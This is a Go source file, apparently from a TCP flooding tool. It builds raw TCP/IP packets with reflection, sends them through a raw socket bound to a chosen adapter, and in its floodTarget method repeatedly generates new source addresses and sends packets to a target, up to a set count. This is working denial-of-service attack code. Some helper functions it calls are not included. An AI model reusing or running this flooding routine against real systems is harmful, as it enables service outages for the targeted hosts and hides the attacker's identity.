package main

import (
	"fmt"
	"os"
	"reflect"
	"syscall"
)

func (tcp TCPIP) rawSocket() {

	var dest [4]byte
	copy(dest[:], tcp.DST[:4])

	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	err := syscall.BindToDevice(fd, tcp.Adapter)
	if err != nil {
		exitErr(fmt.Sprintf("Bind to %s failed", tcp.Adapter), err)
		fmt.Println(err)
		os.Exit(1)
	}

	addr := syscall.SockaddrInet4{
		Port: int(tcp.DstPort),
		Addr: dest,
	}

	err = syscall.Sendto(fd, tcp.Payload, 0, &addr)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf(
			"Socket used:  %d.%d.%d.%d:%d\n",
			tcp.SRC[0], tcp.SRC[1], tcp.SRC[2], tcp.SRC[3], tcp.SrcPort,
		)
	}
}

func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value) {
	var sent uint = 0
	for sent = 0; sent < tcp.SendMax; sent++ {
		tcp.genIP()
		tcp.calcTCPChecksum()
		tcp.buildPayload(rType, rVal)
		tcp.rawSocket()
	}
}

func (tcp *TCPIP) buildPayload(t reflect.Type, v reflect.Value) {
	tcp.Payload = make([]byte, 60)
	var payloadIndex int = 0
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		alias, _ := field.Tag.Lookup("key")
		if len(alias) < 1 {
			key := v.Field(i).Interface()
			keyType := reflect.TypeOf(key).Kind()
			switch keyType {
			case reflect.Uint8:
				tcp.Payload[payloadIndex] = key.(uint8)
				payloadIndex++
			case reflect.Uint16:
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) >> 8)
				payloadIndex++
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) & 0x00FF)
				payloadIndex++
			default:
				for _, element := range key.([]uint8) {
					tcp.Payload[payloadIndex] = element
					payloadIndex++
				}
			}
		}
	}
}
